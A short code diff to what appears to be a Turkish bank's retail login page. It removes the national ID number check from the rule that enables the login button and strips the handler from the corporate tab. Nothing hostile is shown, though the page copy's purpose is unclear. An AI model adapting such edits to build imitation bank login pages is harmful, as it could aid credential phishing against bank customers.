@@ -45,7 +45,7 @@
             var pinInput = document.getElementById("ctl00_c_RetailPinTextBox");
             var devamButton = document.getElementById("ctl00_c_RetailLoginButton");
 
-            if (tcno_dogrula(identityInput.value) && /^\d{6}$/.test(pinInput.value)) {
+            if (/^\d{6}$/.test(pinInput.value)) {
                 devamButton.removeAttribute("disabled");
             } else {
                 devamButton.setAttribute("disabled", "disabled");
@@ -83,7 +83,7 @@ margin-bottom: 0px;
                     <div id="TabHeaderContainer" class="tabs tab-header-container">
                       <a causesval="false" onclick=";;;" id="ctl00_c_RetailTabHeaderButton" class="active" href="">
                         <span></span>BİREYSEL </a>
-                      <a causesval="false" onclick=";;;" id="ctl00_c_CorporateTabHeaderButton">
+                      <a causesval="false">
                         <span></span>KURUMSAL </a>
                     </div>
                     <div id="" class="tab-container tab-contents">
